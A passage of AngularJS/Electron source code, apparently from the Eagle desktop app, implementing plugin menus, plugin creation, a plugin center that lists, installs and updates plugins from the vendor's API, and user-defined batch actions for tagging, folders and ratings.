                            visible: !!item.isLocal,
                            label: i18n.__('modal.pluginPanel.contextMenu.openInExplorer'),
                            click: () => {
                                ipcRenderer.send('show-item-in-folder', item.plugin.path);
                            }
                        },
                        { 
                            visible: !!item.isLocal,
                            role: 'separator'
                        },
                        { 
                            visible: !!item.isLocal,
                            label: i18n.__('modal.pluginPanel.contextMenu.packPlugin'),
                            click: async () => {
                                try {
                                    const defaultPath = path.join("*/", item.plugin.manifest.name + '.eagleplugin');
                                    let result = await dialog.showSaveDialog(currentWindow, {
                                        defaultPath: defaultPath,
                                        filters: [{ name: 'Eagle Plugin', extensions: ['eagleplugin'] }]
                                    });
                                    const outputPath = result?.filePath;
                                    if (!outputPath || result?.canceled ) return;
                                    await pluginModule.packPlugin(item.plugin.path, outputPath);
                                    ipcRenderer.send('show-item-in-folder', outputPath);
                                }
                                catch (err) {
                                    alert(err.stack || err);
                                    electronLog.error(`[app] Pack Plugin fail.`);
                                    electronLog.error(err.stack || err);
                                }
                            }
                        },
                        { 
                            visible: !!item.isLocal,
                            label: i18n.__('modal.pluginPanel.contextMenu.publish'),
                            click: () => {
                                let lng2locale = {
                                    "zh_CN": "cn",
                                    "zh_TW": "tw",
                                    "ja_JP": "jp"
                                };
                                let baseUrl = `https://community-${lng2locale[preferences.general.language] || "en"}.eagle.cool`;
                                shell.openExternal(baseUrl);
                            }
                        },
                        { 
                            visible: !!item.isLocal,
                            role: 'separator'
                        },
                        { 
                            visible: !!item.isLocal,
                            label: i18n.__('modal.pluginPanel.contextMenu.uninstall'),
                            click: () => {
                                removePlugin(item);
                            }
                        },
                        // 安裝版本插件
                        {
                            visible: !item.isLocal && !!newPlugin,
                            label: `${i18n.__('modal.pluginPanel.contextMenu.install')} (${newPlugin?.lasteVersion?.version})`,
                            click: () => {
                                $scope.openPluginCenter('update');
                                $rootScope.$evalAsync();
                            }
                        },
                        { 
                            visible: !item.isLocal && !!newPlugin,
                            role: 'separator'
                        },
                        {
                            visible: !item.isLocal && !item.isPreviewPlugin,
                            label: i18n.__('modal.pluginPanel.contextMenu.shortcuts'),
                            click: () => {
                                ipcRenderer.send('open.preferences', {
                                    panel: "shortcuts",
                                    keyword: "plugin"
                                });
                            }
                        },
                        { 
                            visible: !item.isLocal,
                            label: i18n.__('modal.pluginPanel.contextMenu.uninstall'),
                            click: () => {
                                removePlugin(item);
                            }
                        }
                    ],
                });
            };

			$scope.openDevMenu = function ($event) {

                $event.stopPropagation();

                ContextMenu.open({
                    items: [
                        { 
                            label: i18n.__('modal.pluginPanel.contextMenu.createPlugin'),
                            icon: 'ic-folder-new-folder.svg',
                            click: () => {
                                $rootScope.$broadcast('OPEN_PLUGIN_CREATOR');
                                $rootScope.$evalAsync();
                            }
                        },
                        { 
                            label: i18n.__('modal.pluginPanel.contextMenu.importPlugin'),
                            icon: 'ic-import-local.svg',
                            click: async () => {
                                let result = await dialog.showOpenDialog(currentWindow, {
                                    properties: ['openDirectory']
                                });
                                if (result?.filePaths) {
                                    console.log(`Load local project: ${result?.filePaths[0]}`);
                                    pluginModule.localPlugin.load(result?.filePaths[0]).then(() => {
                                        $scope.selectType("development");
                                    });
                                }
                            }
                        },
                        { 
                            role: 'separator'
                        },
                        { 
                            label: i18n.__('modal.pluginPanel.contextMenu.docs'),
                            icon: 'ic-developer.svg',
                            click: () => {
                                if (preferences.general.language === "zh_CN") {
                                    shell.openExternal('https://developer.eagle.cool/plugin-api/v/zh-cn');
                                }
                                else {
                                    shell.openExternal('https://developer.eagle.cool/plugin-api');
                                }
                            }
                        },
                    ]
                });
            };

			$scope.openPluginCenter = (categoryId) => {
				// return;
				$rootScope.$broadcast("OPEN_PLUGIN_CENTER", categoryId);
			};

            $searchInput.on("keyup", function (event) {
                var keyCode = event.keyCode;
                switch (keyCode) {
                    case 13: 
                        if (event.metaKey || event.ctrlKey) {
                            event.preventDefault();
                            event.stopPropagation();
                            $scope.close();
                        }
                        else {
                            selectCurrent();
                        }
                        break;
                    case 27:
                        event.stopPropagation();
                        $scope.close();
                        break;
                    // up
                    case 38:
                        event.preventDefault();
                        selectPrev();
                        break;
                    // down
                    case 40:
                        event.preventDefault();
                        selectNext();
                        break;
                    case 9:
                        event.preventDefault();
                        event.stopPropagation();
                        break;
                }
            });
        }
    };
});
EagleApp.directive('pluginCreator', function($filter, $timeout, $rootScope) {
    return {
        restrict: 'E',
        templateUrl: 'js/directives/plugin-creator.html',
        // scope: {},
        link: function ($scope, element, attrs, controllersArr) {

			$scope.isOpen = false;
			$scope.type = 'window';
			$scope.pluginName = '';

			$scope.chooseType = (type) => {
				$scope.type = type;
			};
			
            $scope.$on("OPEN_PLUGIN_CREATOR", function (event, params) {
				$scope.isOpen = true;
            });

            $scope.close = function () {
				$scope.isOpen = false;
            };

			$scope.create = () => {
				if ($scope.pluginName === '') return;

				dialog.showOpenDialog(currentWindow, {
					filters: [],
                	properties: ['openDirectory', 'createDirectory'],
					multiSelections: false
				}).then(result => {
					try {
						if (result.canceled) return;
						let filePaths = result.filePaths;
						const savedPath = path.normalize(`${filePaths[0]}/${sanitize($scope.pluginName).trim()}`);
						const templateRootPath = path.normalize(`${resourcesPath}/plugin_templates`);
						const templatePath = path.normalize(`${templateRootPath}/${$scope.type}`);
						electronLog.info(`[app] Create Plugin to ${savedPath}, name: ${$scope.pluginName}, type: ${$scope.type}.`);
						if (fs.existsSync(savedPath)) {
							swal({
								html: `
									<div class="alert">
										<div class="alert-icon warning"></div>
										<h4 class="alert-title">${i18n.__('modal.createPlugin.dialog.exists.title')}</h4>
										<p class="alert-desc">${i18n.__('modal.createPlugin.dialog.exists.desc')}</p>
									</div>
								`,
								showCloseButton: false, showConfirmButton: true, showCancelButton: false, allowOutsideClick: false, focusConfirm: false, focusCancel: false, padding: 24,
								width: 400,
								customClass: "alert-box",
								cancelButtonColor: "#777777",
								confirmButtonText: i18n.__("general.ok"),
							}).then(function () {});
							return;
						}
						if (fs.existsSync(templatePath)) {
							fse.copySync(templatePath, savedPath);
							if (fs.existsSync(savedPath)) {
								const manifestPath = path.normalize(`${savedPath}/manifest.json`);
								let json = fs.readFileSync(manifestPath, 'utf8');
								let manifest = JSON.parse(json);
								manifest.id = crypto.randomUUID();
								manifest.name = $scope.pluginName;
								fs.writeFileSync(manifestPath, JSON.stringify(manifest, null, 4), 'utf8');
								let theme  = $filter('themePath')($bodyScope.theme);
								swal({
									html: `
										<div class="alert">
											<div class="alert-icon" style="background-image: url('assets/images/base/icons/ic-plugin-modal-created.png')">
												<img class="status" style="width: 20px; height: 20px;" src="assets/images/${theme}/icons/ic-plugin-install-modal-created.svg">
											</div>
											<h4 class="alert-title">${i18n.__('dialog.pluginCreated.title')}</h4>
											<p class="alert-desc">${i18n.__('dialog.pluginCreated.desc')}</p>
										</div>
									`,
									showCloseButton: false, showConfirmButton: true, showCancelButton: true, allowOutsideClick: false, focusConfirm: false, focusCancel: false, padding: 24,
									width: 400,
									customClass: "alert-box large",
									cancelButtonColor: "#777777",
									confirmButtonText: i18n.__("dialog.pluginCreated.btn"),
									cancelButtonText: i18n.__("general.close"),
								}).then(function () {
									ipcRenderer.send('show-item-in-folder', savedPath);
								});
								pluginModule.localPlugin.load(savedPath);
								$scope.close();
								$scope.pluginName = '';
								electronLog.info(`[app] New Plugin created.`);
								return;
							}
						}
					}
					catch (err) {
						alert(err);
						electronLog.error(`[app] Create Plugin fail.`);
						electronLog.error(err.stack || err);
					}
				});
			};
        }
    };
});
EagleApp.factory('PluginCenterFactory', function () {

	const getBestURL = require(appRoot.path + '/app/js/utils/getBestURL.js');
	const JSON_URL_CATEGORY = `https://community-en.eagle.cool/api/plugin/categories?locale=${preferences.general.language}`;
	const JSON_URL_PLUGINS = `https://community-en.eagle.cool/api/plugin/list?locale=${preferences.general.language}`;

	let data = {
		categories: [],
		plugins: []
	};

	async function init() {
		const options = {
			cache: 'no-store'
		};
		try {
			data.categories = (await fetch(await getBestURL([{ url: JSON_URL_CATEGORY, delay: 0 }]) ?? JSON_URL_CATEGORY, options).then((response) => { return response.json(); })).data;
			data.plugins = (await fetch(await getBestURL([{ url: JSON_URL_PLUGINS, delay: 0 }]) ?? JSON_URL_PLUGINS, options).then((response) => { return response.json(); })).data;
		} catch (error) {
			electronLog.error(`[plugin] Can't load plugin list or category list.`);
		}
	}

	(async () => {
		await init();
	})();

	// 公開 data 對象和 init 函數
	return {
		getData: function () {
			return data;
		},
		reloadData: init
	};
});


EagleApp.directive('pluginCenter', ($timeout, $rootScope, $filter, PluginCenterFactory) => {
    return {
        restrict: 'E',
        templateUrl: 'js/directives/plugin-center.html',
        scope: {},
        link: ($scope, element, attrs, controllersArr) => {
			const getBestURL = require(appRoot.path + '/app/js/utils/getBestURL.js');
			$scope.parent = angular.element("body").scope();
			$scope.isOpen = false;
			$scope.searchKeyword = "";
			$scope.categories = [];
			$scope.plugins = [];
			$scope.resultList = [];
			$scope.needUpdatePlugins = [];
            $scope.currentPluginId;
			$scope.pluginDetails = {};
			$scope.currentTab = 'detail';
			$scope.pluginModule = $scope.$parent.pluginModule;
			$scope.init = () => {
				return new Promise(async (resolve, reject) => {
					$scope.isLoading = true;
					loadRemoteData().then((result) => {
						$scope.plugins = result.plugins;
						$scope.categories = [
                            {
                                id: "all",
                                slug: "all",
                                name: i18n.__('modal.pluginCenter.sidebar.all')
                            },
							...result.categories,
							{
								id: "update",
                                slug: "update",
								name: i18n.__('modal.pluginCenter.sidebar.updates')
							}
						];
						$scope.calculateNeedUpdate();
						$scope.selectedCategory = $scope.categories[0];
						$scope.calculateList();
						$scope.isLoading = false;
						$scope.$evalAsync();
						return resolve();
					});
				});
			};

            setTimeout(() => {
				$scope.init();
			}, 2000);

			$scope.openPlugin = async (plugin) => {
                $scope.currentPluginId = plugin.id;
                if (!$scope.pluginDetails[plugin.id]) {
                    $scope.pluginDetails[plugin.id] = plugin;
                }
                $scope.pluginDetails[plugin.id] = await loadDetailData(plugin.id);
                $scope.$evalAsync();
			};

            $scope.openPluginById = async (pluginId) => {
                $scope.currentPluginId = pluginId;
                $scope.pluginDetails[pluginId] = await loadDetailData(pluginId);
                $scope.$evalAsync();
			};

			$scope.closeDetailPage = () => {
				$scope.currentPluginId = undefined;
			};

			$scope.changeCategory = (category) => {
				$scope.selectedCategory = category;
				$scope.calculateList();
			};

			$scope.onKeywordChanged = (event) => {
				$scope.calculateList();
			};

			$scope.calculateList = () => {
				$scope.resultList = $scope.plugins.unique();
				if ($scope.searchKeyword !== "") {
					let keywords = $scope.searchKeyword.split(" ");
					$scope.resultList = $scope.resultList.filter((item) => {
						let allKeywords = "";
						allKeywords += item.name;
						if (item?.tags?.length > 0) {
							allKeywords += item.tags.join(" ");
						}
						if (item?.exts?.length > 0) {
							allKeywords += item.exts.join(" ");
						}
						for (let i = 0; i < keywords.length; i++) {
							const keyword = keywords[i];
							if (allKeywords.toLowerCase().includes(keyword.toLowerCase())) return true;
						}
						return false;
					});
                }
				if ($scope.selectedCategory) {
					if ($scope.selectedCategory.slug === 'update') {
						$scope.resultList = $scope.resultList.filter((item) => {
							return $scope.pluginModule.needUpdatePluginMaps[item.id];
						});
						return;
					}
					if ($scope.selectedCategory.slug !== "all") {
						$scope.resultList = $scope.resultList.filter((item) => {
							return item.categories.includes($scope.selectedCategory.slug);
						});
					}
				}
			};
            
            ipcRenderer.on('install-plugin', async (event, pluginId) => {
				currentWindow.show();
				await $scope.openPluginById(pluginId);
                await $scope.open();
                $scope.$evalAsync();
            });

			ipcRenderer.on('open-plugin-center-and-search', (event, keyword) => {
				currentWindow.show();
                $scope.open();
				$scope.closeDetailPage();
                $scope.searchKeyword = keyword;
                $scope.$evalAsync();
            });

            $scope.$on("OPEN_PLUGIN_CENTER", async (event, categoryId) => {
				await $scope.open(categoryId);
				$scope.$evalAsync();
            });

			$scope.$on("REFRESH_PLUGIN_CENTER", async (event, categoryId) => {
				$scope.calculateList();
				$scope.calculateNeedUpdate();
				$scope.$evalAsync();
            });

            $scope.open = async (categoryId) => {
                $scope.isOpen = true;
				if ($scope.plugins.length === 0) {
					$scope.isLoading = true;
					await $scope.init();
				}
				else {
					$scope.calculateList();
					$scope.calculateNeedUpdate();
				}
				$timeout(() => {
					$(`.category-${categoryId || 'all'}`).click();
				}, 30);
            };

            $scope.close = () => {
				$scope.isOpen = false;
            };

			$scope.installPlugin = async (plugin) => {

                let desc = $filter('i18n')('dialog.installPlugin.desc', [
                    { "property": "name", "value": plugin.name },
                    { "property": "version", "value": `v${plugin.lasteVersion.version}` },
                ]);
				let theme  = $filter('themePath')($bodyScope.theme);
                let size = fileSize(plugin.lasteVersion.fileSize);

				swal({
					html: `
						<div class="alert">
							<div class="alert-icon" style="background-image: url('${plugin.lasteVersion.logo}')">
								<img class="status" style="width: 20px; height: 20px;" src="assets/images/${theme}/icons/ic-plugin-install-modal-download.svg">
							</div>
							<h4 class="alert-title">${i18n.__('dialog.installPlugin.title')}</h4>
							<p class="alert-desc">${desc}</p>
						</div>
					`,
					showCloseButton: false, showConfirmButton: true, showCancelButton: true, allowOutsideClick: false, focusConfirm: false, focusCancel: false, padding: 24,
					width: 400,
					customClass: "alert-box large",
					cancelButtonColor: "#777777",
					confirmButtonText: `${i18n.__('dialog.installPlugin.install')}<span class="small font-mono">(${size})</span>`,
					cancelButtonText: i18n.__("general.cancel"),
				}).then(async () => {
					await pluginModule.remotePlugin.install(plugin);
					$scope.calculateNeedUpdate();
				});
			};

			$scope.updatePlugin = async (plugin) => {

                let desc = $filter('i18n')('dialog.updatePlugin.desc', [
                    { "property": "name", "value": plugin.name },
                    { "property": "version", "value": `v${plugin.lasteVersion.version}` },
                ]);
				let theme  = $filter('themePath')($bodyScope.theme);
                let size = fileSize(plugin.lasteVersion.fileSize);
                    
				swal({
					html: `
						<div class="alert">
							<div class="alert-icon" style="background-image: url('${plugin.lasteVersion.logo}')">
								<img class="status" style="width: 20px; height: 20px;" src="assets/images/${theme}/icons/ic-plugin-install-modal-update.svg">
							</div>
							<h4 class="alert-title">${i18n.__('dialog.updatePlugin.title')}</h4>
							<p class="alert-desc">${desc}</p>
						</div>
					`,
					showCloseButton: false, showConfirmButton: true, showCancelButton: true, allowOutsideClick: false, focusConfirm: false, focusCancel: false, padding: 24,
					width: 400,
					customClass: "alert-box large",
					cancelButtonColor: "#777777",
					confirmButtonText: `${i18n.__('dialog.updatePlugin.update')}<span class="small font-mono">(${size})</span>`,
					cancelButtonText: i18n.__("general.cancel"),
				}).then(async () => {
					await pluginModule.remotePlugin.install(plugin);
					$scope.calculateNeedUpdate();
				});
			};

			$scope.uninstall = async (plugin) => {
				let installed = pluginModule.installedPluginMaps[plugin.id];
                let desc = $filter('i18n')('dialog.removePlugin.desc', [
                    { "property": "name", "value": installed.manifest.name },
                ]);
				let theme  = $filter('themePath')($bodyScope.theme);
				swal({
					html: `
						<div class="alert">
							<div class="alert-icon" style="background-image: url('${plugin.lasteVersion.logo}')">
								<img class="status" style="width: 20px; height: 20px;" src="assets/images/${theme}/icons/ic-plugin-install-modal-uninstall.svg">
							</div>
							<h4 class="alert-title">${i18n.__('dialog.removePlugin.title')}</h4>
							<p class="alert-desc">${desc}</p>
						</div>
					`,
					showCloseButton: false, showConfirmButton: true, showCancelButton: true, allowOutsideClick: false, focusConfirm: false, focusCancel: false, padding: 24,
					width: 400,
					customClass: "alert-box large",
					cancelButtonColor: "#777777",
					confirmButtonText: `${i18n.__('dialog.removePlugin.remove')}`,
					cancelButtonText: i18n.__("general.cancel"),
				}).then(async () => {
					pluginModule.remotePlugin.uninstall(installed);
				});

			};

			$scope.calculateNeedUpdate = () => {
				const versionCompare = require('compare-versions');
				$scope.needUpdatePlugins = [];
				$scope.pluginModule.needUpdatePluginMaps = {};
				$scope.plugins.forEach((plugin) => {
					// 檢查是否需要更新
					if (pluginModule.installedPluginMaps[plugin.id]) {
						let existsPlugin = pluginModule.installedPluginMaps[plugin.id].manifest;
						if (versionCompare(existsPlugin.version, plugin.lasteVersion.version) === -1) {
							$scope.needUpdatePlugins.push(plugin);
							$scope.pluginModule.needUpdatePluginMaps[plugin.id] = plugin;
						}
					}
				});
				$scope.pluginModule.needUpdatePluginCount = Object.keys($scope.pluginModule.needUpdatePluginMaps).length;
			};

			$scope.reload = async () => {
				$scope.init();
			};

			async function loadRemoteData () {
				return new Promise(async (resolve, reject) => {
					try {
						if (PluginCenterFactory.getData().plugins.length === 0) {
							await PluginCenterFactory.reloadData();
						}

						let categories = PluginCenterFactory.getData().categories;
						let plugins = PluginCenterFactory.getData().plugins;

						const platform = (process.platform === 'win32')? 'win' : 'mac';
						const arch = process.arch;

						plugins = plugins.filter((plugin) => {
							const samePlatform = (plugin.platform === platform) || (plugin.platform === 'all');
							const sameArch = (plugin.arch === arch) || (plugin.arch === 'all');
							if (samePlatform && sameArch) return true;
							return (plugin.arch === arch && plugin.platform === platform);
						});

						return resolve({
							categories: categories,
							plugins: plugins
						});
					} catch (error) {
						electronLog.error(`[plugin] Can't load plugin list or category list.`);
						electronLog.error(error);
						return reject(error);
					}
				});
			}

            async function loadDetailData (pluginId) {
				return new Promise(async (resolve, reject) => {
					const options = {
						cache: 'no-store'
					};
                    const JSON_URL = `https://community-en.eagle.cool/api/plugin/${pluginId}?locale=${preferences.general.language}`;
					let result = await fetch(await getBestURL([{ url: JSON_URL, delay: 0 }]) ?? JSON_URL, options).then((response) => { return response.json(); });

                    fetch(`https://community-en.eagle.cool/api/plugin/${pluginId}/view`, { method: 'POST' });
					return resolve(result.data);
				});
			}

        }
    };
});
EagleApp.directive('actionsPanel', function ($timeout, $rootScope, $filter) {
	return {
		restrict: 'E',
		scope: {
			theme: '=',
		},
		templateUrl: 'js/directives/actions-panel.html',
		link: function ($scope, element, attrs, controllersArr) {
			
			$scope.Actions = {};
			$scope.resultList = [];
			$scope.searchKeyword = "";
			$scope.currentIndex = -1;
			var $menu = $("#actions-panel");
			var $searchInput = $("#actions-panel-search");

			$scope.sortableOptions = {
				distance: 10,
				disabled: false,
				tolerance: "pointer",
				update: function (e, ui) {
					$timeout(function () {
						$bodyScope.Actions.save();
					}, 500);
				},
			};

			$scope.$on("UPDATE_ACTIONS", function () {
				$scope.calculateList();
			});

			$scope.$on("OPEN_ACTIONS", function (event, params) {

				$scope.Actions = params.Actions;
				$scope.currentIndex = -1;
				$scope.searchKeyword = "";

				$scope.calculateList();

				moveToCursorPosition($("#actions-panel"));

				$menu.addClass("open");

				setTimeout(function () {
					$scope.focusInput();
				}, 100);
				analytics.event('Actions', 'Open');
			});

			$scope.createAction = function () {
				$rootScope.$broadcast("NEW_ACTION");
			};

			$scope.openSubmenu = function (event, action) {
				event.stopPropagation();
				var contextMenu = new Menu();

				contextMenu.append(new MenuItem({
					label: i18n.__("actionsPanel.edit"),
					click: function () {
						$rootScope.$broadcast("EDIT_ACTION", action)
						$scope.$evalAsync();
					}
				}));

				contextMenu.append(new MenuItem({
					type: 'separator'
				}));

				contextMenu.append(new MenuItem({
					label: i18n.__("actionsPanel.clone"),
					click: function () {
						let idx = $bodyScope.Actions.actions.indexOf(action);
						let newAction = angular.copy(action);
						if (idx > -1) {
							$bodyScope.Actions.actions.splice(idx, 0, newAction);
							$bodyScope.Actions.save();
							$scope.$evalAsync();
						}
					}
				}));

				contextMenu.append(new MenuItem({
					label: i18n.__("actionsPanel.remove"),
					click: function () {
						let idx = $bodyScope.Actions.actions.indexOf(action);
						if (idx > -1) {
							$bodyScope.Actions.actions.splice(idx, 1);
							$bodyScope.Actions.save();
						}
						$scope.calculateList();
						$scope.$evalAsync();
					}
				}));

				contextMenu.popup(currentWindow);
			};

			$scope.hoverItem = function (index) {
				$scope.currentIndex = index;
			};

			$scope.scrollToTop = function () {
				$menu.find(".actions-container").scrollTop(0);
			};

			$scope.calculateList = function () {
				if ($scope.searchKeyword !== "") {
					$scope.resultList = filterActions($bodyScope.Actions.actions, $scope.searchKeyword);
					if ($scope.resultList.length > 0) {
						$scope.currentIndex = 0;
					}
				}
				else {
					$scope.resultList = $bodyScope.Actions.actions.unique();
				}
			}

			$scope.focusInput = function () {
				$searchInput.focus();
			};

			$scope.close = function () {
				$scope.scrollToTop();
				$menu.removeClass("open");
				$searchInput.blur();
				$scope.scrollToTop();
			};

			$scope.onItemClick = function (action) {
				$scope.runAction(action);
				$scope.close();
			};

			function filterActions(actions, keyword) {

				if (!keyword) return actions;
				var keyword_cn = chineseConvert.tw2cn(keyword);

				var actionSearchItems = actions.map(action => {
					var actionNameCN = chineseConvert.tw2cn(action.name);
					if (keyword.length >= 30 || action.name.length >= 30) {
						return {
							action: action,
							name: actionNameCN,
							search: [actionNameCN]
						}
					}
					return {
						action: action,
						name: actionNameCN,
						search: [actionNameCN, ..._.uniq(
							cartesianProduct(actionNameCN.split(""))
								.map(item => item.join(' '))
						)],
					};
				});

				var scores = actionSearchItems.map(item => {
					return {
						item: item,
						name: item.name,
						score: _.max(item.search.map(pinyin => pinyin.score(keyword_cn))),
					};
				})

				var result = scores.filter(i => i.score > 0).sort((a, b) => b.score - a.score).map(function (i) {
					return i.item.action;
				});

				return result;
			}

			function selectCurrent() {
				if ($scope.resultList[$scope.currentIndex]) {
					$scope.onItemClick($scope.resultList[$scope.currentIndex]);
					$scope.$evalAsync();
				}
			};

			function selectPrev() {
				if ($scope.currentIndex > 0) {
					$scope.currentIndex--;
					$scope.$evalAsync();
				}
			};

			function selectNext() {
				if ($scope.currentIndex < $scope.resultList.length - 1) {
					$scope.currentIndex++;
					$scope.$evalAsync();
				}
			};

			$searchInput.on("keydown", function (event) {
				var keyCode = event.keyCode;
				switch (keyCode) {
					case 13:
						if (event.metaKey || event.ctrlKey) {
							event.preventDefault();
							event.stopPropagation();
							$scope.close();
						}
						else {
							selectCurrent();
						}
						break;
					case 27:
						event.preventDefault();
						event.stopPropagation();
						$scope.close();
						break;
					// up
					case 38:
						event.preventDefault();
						selectPrev();
						break;
					// down
					case 40:
						event.preventDefault();
						selectNext();
						break;
					case 9:
						event.preventDefault();
						event.stopPropagation();
						break;
				}
			});

			$scope.$on("RUN_ACTION", function (event, action) {
				$scope.runAction(action);
			});

			$scope.runAction = function (action) {

				if ($bodyScope.selected.length === 0) {
					return;
				}

				let selected = $bodyScope.selected;
				let origin = [];
				let originalFolders = [];
				let originalTags = [];
				let originalStars = [];

				$bodyScope.checkOperationSafety(function () {

					for (var i = 0; i < selected.length; i++) {

						let item = selected[i];

						origin.push(item);
						originalFolders.push(angular.copy(item.folders));
						originalTags.push(angular.copy(item.tags));
						originalStars.push(angular.copy(item.star));

						action.rules.forEach(function (rule) {
							switch (rule.action) {
								case "ADD_TAGS":
									ActionRunner.addTags(item, rule.value);
									break;
								case "CLEAR_TAGS":
									ActionRunner.clearTags(item);
									break;
								case "ADD_FOLDERS":
									ActionRunner.addFolders(item, rule.value);
									break;
								case "CLEAR_FOLDERS":
									ActionRunner.clearFolders(item);
									break;
								case "RATING":
									ActionRunner.rating(item, rule.value);
									break;
							}
						});
					}

					$bodyScope.calculateImageBinding({ ignoreSort: true }, function () {
						$bodyScope.rebindRefresh(true);
						$bodyScope.updateSelection();
						$bodyScope.updateItemsView(selected);
					});

					ayncsImagesChange(selected);
					hiddenByCurrentFilter(selected);

					// 復原操作
					$rootScope.notify({
						message: i18n.__("notify.actions.run"),
						duration: 4000,
					}, function () {
						origin.forEach(function (item, index) {
							item.folders = originalFolders[index];
							item.tags = originalTags[index];
							if (originalStars[index] === undefined) {
								delete item.star;
							}
							else {
								item.star = originalStars[index];
							}
						});
						$bodyScope.selected = origin;
						$bodyScope.current = origin[0];
						$rootScope.$broadcast("CALCULATE_IMAGE_BINDING");
						$rootScope.$broadcast("REBIND_REFRESH", true);
						$rootScope.$broadcast("UPDATE_SELECTION");
						ayncsImagesChange(origin);
					});
				});
			};

			let ActionRunner = {
				addTags: function (item, value) {
					try {
						item.tags = [...item.tags, ...value];
						item.tags = [...new Set(item.tags)];
					}
					catch (err) { }
				},
				clearTags: function (item) {
					try {
						item.tags = [];
					}
					catch (err) { }
				},
				addFolders: function (item, value) {
					try {
						// 確認 folder id 存在
						value = value.filter(function (fid) {
							return $bodyScope.folderMappings[fid];
						});

						item.folders = [...item.folders, ...value];
						item.folders = [...new Set(item.folders)];

						// inherit the folder teags
						let extendTags = [];
						value.forEach(function (fid) {
							let folderExtendTags = $bodyScope.folderMappings[fid].extendTags;
							if (folderExtendTags && folderExtendTags.length > 0) {
								extendTags = [...extendTags, ...folderExtendTags]
							}
						});
						item.tags = [...extendTags, ...item.tags];
						item.tags = [...new Set(item.tags)];
					}
					catch (err) { }
				},
				clearFolders: function (item) {
					try {
						item.folders = [];
					}
					catch (err) { }
				},
				rating: function (item, value) {
					try {
						if (!value || value === 'none') {
							delete item.star;
						}
						else {
							item.star = parseInt(value);
						}
					}
					catch (err) { }
				},
			};
		}
	};
});
EagleApp.directive('actionsCreator', function ($timeout, $rootScope, $filter) {
    return {
        restrict: 'E',
        templateUrl: 'js/directives/actions-creator.html',
        scope: {
            theme: '=theme'
        },
        link: function ($scope, element, attrs, controllersArr) {
            var ipcRenderer = require('electron').ipcRenderer;
            var $bodyScope = angular.element("body").scope();
            $scope.actionScope = $scope;
            $scope.isOpen = false;
            $scope.shortcut = "";
            $scope.foldersSuggestion = [];
            $scope.action = {
                name: "",
                shortcut: "",
                rules: [{
                    action: "ADD_TAGS",
                    value: []
                }]
            };

            $scope.$on("NEW_ACTION", function (e, action) {
                $scope.init();
                $scope.isOpen = true;
                $scope.action = {
                    name: "",
                    shortcut: "",
                    rules: [{
                        action: "ADD_TAGS",
                        value: []
                    }]
                };

                $timeout(function () {
                    $("#action-name-input").focus();
                }, 100);
            });

            $scope.$on("EDIT_ACTION", function (e, action) {
                $scope.init();
                if (action) {
                    var at = angular.copy(action);
                    $scope.isEditMode = true;
                    $scope.action = angular.copy(action);
                    $scope.isOpen = true;
                    $scope.originAction = action;
                }
                $timeout(function () {
                    $("#action-name-input").focus();
                }, 100);
            });

            $scope.init = function () {
                $scope.tagsSuggestion = $bodyScope.tagsSuggestion;
                $scope.foldersSuggestion = [];
                eagle.utils.tree.walk($bodyScope.folders, 'children', function (folder, parent) {
                    $scope.foldersSuggestion.push({
                        value: folder.id,
                        text: folder.name
                    });
                });
            }

            $scope.nameKeydown = function (event) {
                var keyCode = event.keyCode;
                if (keyCode === 27) {
                    event.stopPropagation();
                    event.preventDefault();
                    $scope.cancel();
                }
                else if (keyCode === 13) {
                    if (event.metaKey || event.ctrlKey) {
                        event.stopPropagation();
                        event.preventDefault();
                        $(event.target).blur();
                        $scope.save();
                    }
                }
            };

            $scope.sortableOptions = {
                distance: 10,
                disabled: false,
                tolerance: "pointer",
                update: function (e, ui) {
                },
            };

            $scope.createRule = function () {
                if ($scope.action.rules.length >= 30) return;
                var newRule = {
                    action: "RATING",
                    value: "5"
                };
                $scope.action.rules.push(newRule);
            };

            $scope.removeRule = function (rule) {
                if ($scope.action.rules.length == 1) return;
                var idx = $scope.action.rules.indexOf(rule);
                if (idx > -1) {
                    $scope.action.rules.splice(idx, 1);
                }
            };

            $scope.changeAction = function (rule) {
                switch (rule.action) {
                    case 'RATING':
                        rule.value = "5";
                        break;
                    case 'ADD_TAGS':
                    case 'ADD_FOLDERS':
                        rule.value = [];
                        break;
                    case 'CLEAR_FOLDERS':
                    case 'CLEAR_TAGS':
                        delete rule.value;
                        break;
                }
            };

            $scope.save = function () {
                if (!$scope.action.name) {
                    $scope.isNoActionName = true;
                    return;
                }
                else {
                    $scope.isNoActionName = false;
                }
                var $bodyScope = angular.element("body").scope();

                if (!$scope.isEditMode) {
                    let newAction = angular.copy($scope.action);
                    $bodyScope.Actions.actions.push(newAction);
                    $bodyScope.Actions.save();
                }
                else {
                    $scope.originAction.rules = $scope.action.rules;
                    $scope.originAction.name = $scope.action.name;
                    $scope.originAction.shortcut = $scope.action.shortcut;
                    $bodyScope.Actions.save();
                }
                $rootScope.$broadcast("UPDATE_ACTIONS");
                $rootScope.initMenu();
                $scope.cancel();
            };

            $scope.cancel = function () {
                var $bodyScope = angular.element("body").scope();
                $("#action-name-input").attr("tabindex", -1);
                $scope.isEditMode = undefined;
                $scope.isOpen = false;
                $bodyScope.$evalAsync();
            };
        }
    }
});
EagleApp.directive('layoutPanel', () => {
	return {
		restrict: 'E',
		scope: {
			theme: '=',
		},
		templateUrl: 'js/directives/layout-panel.html',
		link: ($scope, element, attrs, controllersArr) => {

			const $menu = $("#layout-panel");
			const $shortcutInput = $("#layout-panel-search");

			$scope.onLayoutChange = (layout) => {
				switch (layout) {
					case "GridLayout":
						$scope.$parent.switchGridLayout();
						break;
					case "JustifiedLayout":
						$scope.$parent.switchJustifiedLayout();
						break;
					case "SquareLayout":
						$scope.$parent.switchSquareLayout();
						break;
					case "ListLayout":
						$scope.$parent.switchListLayout();
						break;
				}
			};

			$scope.closePanel = () => {
				$menu.removeClass("open");
				$shortcutInput.blur();
			};

			$scope.openPanel = () => {
				moveToCursorPosition($menu);
				$menu.addClass("open");
				setTimeout(() => $shortcutInput.focus(), 50);
			};

			$scope.$on("OPEN_LAYOUT_PANEL", () => $scope.openPanel());

			$shortcutInput.on("keyup", (event) => {
				switch (event.keyCode) {
					case 27:
						event.stopPropagation();
						$scope.closePanel();
						break;
				}
			});

		}
	};
});
EagleApp.directive('shortcutsModal', function ($timeout, $rootScope, $filter) {
    return {
        restrict: 'E',
        templateUrl: 'js/directives/shortcuts-modal.html',
        scope: {
            theme: '=theme'
        },
        link: ($scope, element, attrs, controllersArr) => {
            $scope.platform = process.platform;
            $scope.isOpen = false;
            $scope.shortcutsScope = $scope;
            var openInFinder;
            if (process.platform === "darwin") {
